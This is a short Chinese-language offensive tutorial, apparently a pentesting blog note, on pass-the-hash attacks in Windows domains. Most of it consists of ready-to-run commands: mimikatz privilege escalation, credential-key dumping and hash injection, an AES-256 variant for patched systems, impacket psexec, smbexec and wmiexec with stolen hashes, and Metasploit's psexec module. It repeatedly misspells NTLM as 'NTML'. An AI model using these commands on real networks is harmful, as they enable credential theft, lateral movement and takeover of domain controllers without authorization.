---
title: 【后渗透】Hash传递攻击
---
## Hash传递攻击

> 哈希传递（Pass The Hash）攻击，直接将`NTML Hash`的散列值传递到其它主机，进行权限认证，获取控制权。
>
> 在域环境中，用户大都使用域账号登录，大量计算机在安装时会使用相同的本地管理员账号和密码；
>
> 因此，**如果计算机的本地账户名密码和目标相同**，就能通过哈希传递攻击获取目标主机控制权。
>
> **想要使用mimikatz的哈希传递功能，必须具有本地管理员权限（mimikatz需要高权限进程lsass.exe的执行权限）**

## 一、使用NTML Hash进行哈希传递

**（1）在目标机器中以管理员权限运行mimikatz**

```bash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:wintrysec.lab /ntlm:<NTML Hash>"
#<NTML Hash>为：f3a0acba8bcfb8a0896281bbfcb793ed这样的一串字符
```

**（2）列出目标域控C盘内容**（会自动弹出一个cmd.exe）

```bash
dir \\DC\c$   #测试是否成功
```

## 二、使用AES-256进行哈希传递 

> 当系统安装了`KB2871997`补丁，将无法使用常规的哈希传递攻击；
>
> 但是SID为500的Admintrator用户，依然可以使用哈希传递，或者使用AES-256进行哈希传递。

**（1）抓取AES-256密钥**

```bash
mimikatz.exe "privilege::debug" "sekurlsa::ekeys"
```

**（2）管理员权限运行mimikatz**

```bash
mimikatz "privilege::debug" "sekurlsa::pth /user:Administrator /domain:wintryse.lab /aes256:<AES-256密钥>"
```

## 三、不使用mimikatz进行哈希传递

**使用impacket软件包**

```bash
psexec.py -hashes :<hash> 域/域用户名@目标IP
smbexec.py -hashes :<hash> 域/域用户名@目标IP
wmiexec.py -hashes :<hash> 域/域用户名r@目标IP whoami
```

**MSF模块**

```bash
use exploit/windows/smb/psexec

#关键设置
set SMBPass <LM Hash>:<NTML Hash>
```
